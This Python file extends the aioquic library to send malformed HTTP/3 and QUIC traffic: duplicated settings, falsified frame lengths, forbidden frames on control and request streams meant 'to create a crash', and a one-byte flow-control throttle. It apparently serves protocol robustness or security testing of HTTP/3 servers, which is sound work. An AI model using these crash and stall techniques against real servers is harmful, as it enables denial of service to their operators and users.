import aioquic
from aioquic.h3.connection import (
    H3Connection, 
    HeadersState, 
    FrameUnexpected, 
    encode_frame, 
    FrameType, 
    encode_settings,
    Setting,
    StreamType,
    encode_uint_var
)
from aioquic.h3.events import Headers
from aioquic.buffer import Buffer, UINT_VAR_MAX_SIZE
from aioquic.quic.connection import QuicConnection, MAX_STREAM_DATA_FRAME_CAPACITY
from aioquic.quic.packet_builder import QuicPacketBuilder
from aioquic.quic.recovery import QuicPacketSpace
from aioquic.quic.stream import QuicStream
from aioquic.quic.packet import QuicFrameType

# Adjusted encode_setting to send multiple identical settings or special values.
def encode_settings_T4(settings: dict, settings_value, duplicate: int = 0) -> bytes:
    buf = Buffer(capacity=4096)
    for setting, value in settings.items():
        if setting == Setting.MAX_FIELD_SECTION_SIZE:
            for i in range(0,1 + duplicate):
                buf.push_uint_var(setting)
                if isinstance(settings_value, bytes):
                    buf.push_bytes(settings_value)
                else:
                    buf.push_uint_var(settings_value)
        else:
            buf.push_uint_var(setting)
            buf.push_uint_var(value)
    return buf.data

# Adjusted Frame encoding to manipulate the Frame-Length.
def encode_frame_T7(frame_type: int, frame_data: bytes, length_offset: int) -> bytes:
    frame_length = len(frame_data)
    buf = Buffer(capacity=frame_length + 2 * UINT_VAR_MAX_SIZE)
    buf.push_uint_var(frame_type)
    buf.push_uint_var(frame_length + length_offset)
    buf.push_bytes(frame_data)
    return buf.data

# A adjusted H3Connection to carry out attacks during the HTTP3 connection setup or later on.
class H3ConnectionChild(H3Connection):
    def __init__(self, quic: QuicConnection,  settings_value, more_settings: dict = {},enable_webtransport: bool = False, duplicate: int = 0, length_offset: int = 0, wrong_frames: dict = {}) -> None:
        self._settings_value = settings_value
        self._more_settings = more_settings
        self._duplicate = duplicate
        self._length_offset = length_offset
        self._wrong_frames = wrong_frames
        super().__init__(quic=quic, enable_webtransport=enable_webtransport)

    def _init_connection(self) -> None:
        # send our settings
        self._local_control_stream_id = self._create_uni_stream(StreamType.CONTROL)
        self._sent_settings = self._get_local_settings()
        self._quic.send_stream_data(
            self._local_control_stream_id,
            encode_frame(FrameType.SETTINGS, encode_settings_T4(self._sent_settings, settings_value=self._settings_value, duplicate=self._duplicate)),
        )
        if self._is_client and self._max_push_id is not None:
            self._quic.send_stream_data(
                self._local_control_stream_id,
                encode_frame(FrameType.MAX_PUSH_ID, encode_uint_var(self._max_push_id)),
            )
        
        if self._wrong_frames["controlstream-data"] == True:
            self.send_data(self._local_control_stream_id, bytes(0), False)

        if self._wrong_frames["controlstream-headers"] == True:
            send_headers_corrupt(self, self._local_control_stream_id)


        # create encoder and decoder streams
        self._local_encoder_stream_id = self._create_uni_stream(
            StreamType.QPACK_ENCODER
        )
        self._local_decoder_stream_id = self._create_uni_stream(
            StreamType.QPACK_DECODER
        )


    def _get_local_settings(self) -> dict:
        """
        Return the local HTTP/3 settings.
        """
        settings = {
            Setting.QPACK_MAX_TABLE_CAPACITY: self._max_table_capacity,
            Setting.QPACK_BLOCKED_STREAMS: self._blocked_streams,
            Setting.ENABLE_CONNECT_PROTOCOL: 1,
            Setting.DUMMY: 1,
            Setting.MAX_FIELD_SECTION_SIZE: 2048
        }

        settings = {**settings, **self._more_settings}

        if self._enable_webtransport:
            settings[Setting.H3_DATAGRAM] = 1
            settings[Setting.ENABLE_WEBTRANSPORT] = 1
        return settings

    def send_data(self, stream_id: int, data: bytes, end_stream: bool) -> None:
        """
        Send data on the given stream.

        To retrieve datagram which need to be sent over the network call the QUIC
        connection's :meth:`~aioquic.connection.QuicConnection.datagrams_to_send`
        method.

        :param stream_id: The stream ID on which to send the data.
        :param data: The data to send.
        :param end_stream: Whether to end the stream.
        """

        # log frame
        if self._quic_logger is not None:
            self._quic_logger.log_event(
                category="http",
                event="frame_created",
                data=self._quic_logger.encode_http3_data_frame(
                    length=len(data), stream_id=stream_id
                ),
            )

        self._quic.send_stream_data(
            stream_id, encode_frame_T7(FrameType.DATA, data, self._length_offset), end_stream
        )

# Several functions to send an invalid frame:

def send_data_without_check(self, stream_id: int, data: bytes, end_stream: bool) -> None:
        """
        Send data on the given stream.

        To retrieve datagram which need to be sent over the network call the QUIC
        connection's :meth:`~aioquic.connection.QuicConnection.datagrams_to_send`
        method.

        :param stream_id: The stream ID on which to send the data.
        :param data: The data to send.
        :param end_stream: Whether to end the stream.
        """
        stream = self._get_or_create_stream(stream_id)

        # check DATA frame is allowed
        """
        if stream.headers_send_state != HeadersState.AFTER_HEADERS:
            raise FrameUnexpected("DATA frame is not allowed in this state")
        """

        # log frame
        if self._quic_logger is not None:
            self._quic_logger.log_event(
                category="http",
                event="frame_created",
                data=self._quic_logger.encode_http3_data_frame(
                    length=len(data), stream_id=stream_id
                ),
            )

        self._quic.send_stream_data(
            stream_id, encode_frame(FrameType.DATA, data), end_stream
        )

def send_headers_settings(
    conn: H3Connection, stream_id: int, headers: Headers, end_stream: bool = False
) -> None:
    """
    Send headers on the given stream.

        To retrieve datagram which need to be sent over the network call the QUIC
        connection's :meth:`~aioquic.connection.QuicConnection.datagrams_to_send`
        method.

        :param stream_id: The stream ID on which to send the headers.
        :param headers: The HTTP headers to send.
        :param end_stream: Whether to end the stream.
    """
        # check HEADERS frame is allowed
    stream = conn._get_or_create_stream(stream_id)
    if stream.headers_send_state == HeadersState.AFTER_TRAILERS:
        raise FrameUnexpected("HEADERS frame is not allowed in this state")

    frame_data = conn._encode_headers(stream_id, headers)

    # log frame
    if conn._quic_logger is not None:
        conn._quic_logger.log_event(
            category="http",
            event="frame_created",
            data=conn._quic_logger.encode_http3_headers_frame(
                length=len(frame_data), headers=headers, stream_id=stream_id
            ),
        )

    # update state
    if stream.headers_send_state == HeadersState.INITIAL:
        stream.headers_send_state = HeadersState.AFTER_HEADERS
    else:
        stream.headers_send_state = HeadersState.AFTER_TRAILERS

    # Sending SETTINGS Frame on Request Stream to create a crash:
    conn._sent_settings = conn._get_local_settings()
    conn._quic.send_stream_data(
        stream_id,
        encode_frame(FrameType.SETTINGS, encode_settings(conn._sent_settings)),
    )

    # Send headers
    conn._quic.send_stream_data(
        stream_id, encode_frame(FrameType.HEADERS, frame_data), end_stream
    )

def send_settings_corrupt(
    conn: H3Connection, stream_id: int, end_stream: bool = False
) -> None:

    # Sending SETTINGS Frame
    conn._sent_settings = conn._get_local_settings()
    conn._quic.send_stream_data(
        stream_id,
        encode_frame(FrameType.SETTINGS, encode_settings(conn._sent_settings)),
    )

def send_headers_corrupt(
    conn: H3Connection, stream_id: int, end_stream: bool = False
) -> None:

    headers=[
        (b":method", "GET".encode()),
        (b":scheme", "SOMEURL".encode()),
        (b":authority", "AUTHORITY".encode()),
        (b":path", "FULLPATH".encode()),
        (b"user-agent", "USER_AGENT".encode()),
    ]


    # Send headers
    conn._quic.send_stream_data(
        stream_id, encode_frame(FrameType.HEADERS, bytes(0)), end_stream
    )

def send_goaway_corrupt(
    conn: H3Connection, stream_id: int, end_stream: bool = False
) -> None:

    # Send headers
    conn._quic.send_stream_data(
        stream_id, encode_frame(FrameType.GOAWAY, bytes(0)), end_stream
    )

# Adjusted Version of the "QuicConnection._write_stream_limits" function. Flowcontrol is increased by 1 byte instead of doubling it.
def fun(self, builder: QuicPacketBuilder, space: QuicPacketSpace, stream: QuicStream):
    if (
            stream.max_stream_data_local
            and stream.receiver.highest_offset * 2 > stream.max_stream_data_local
        ):
            stream.max_stream_data_local += 1
            self._logger.debug(
                "Stream %d local max_stream_data raised to %d",
                stream.stream_id,
                stream.max_stream_data_local,
            )
    if stream.max_stream_data_local_sent != stream.max_stream_data_local:
        buf = builder.start_frame(
            QuicFrameType.MAX_STREAM_DATA,
            capacity=MAX_STREAM_DATA_FRAME_CAPACITY,
            handler=self._on_max_stream_data_delivery,
            handler_args=(stream,),
        )
        buf.push_uint_var(stream.stream_id)
        buf.push_uint_var(stream.max_stream_data_local)
        stream.max_stream_data_local_sent = stream.max_stream_data_local

        # log frame
        if self._quic_logger is not None:
            builder.quic_logger_frames.append(
                self._quic_logger.encode_max_stream_data_frame(
                    maximum=stream.max_stream_data_local, stream_id=stream.stream_id
                )
            )


# Adjusted Version of H3Connection with QUIC Monkeypatch 
class H3ConnectionFlowControl(H3Connection):
    def __init__(self, quic: QuicConnection, enable_webtransport: bool = False) -> None:
        QuicConnection._write_stream_limits = fun
        super().__init__(quic=quic, enable_webtransport=enable_webtransport)
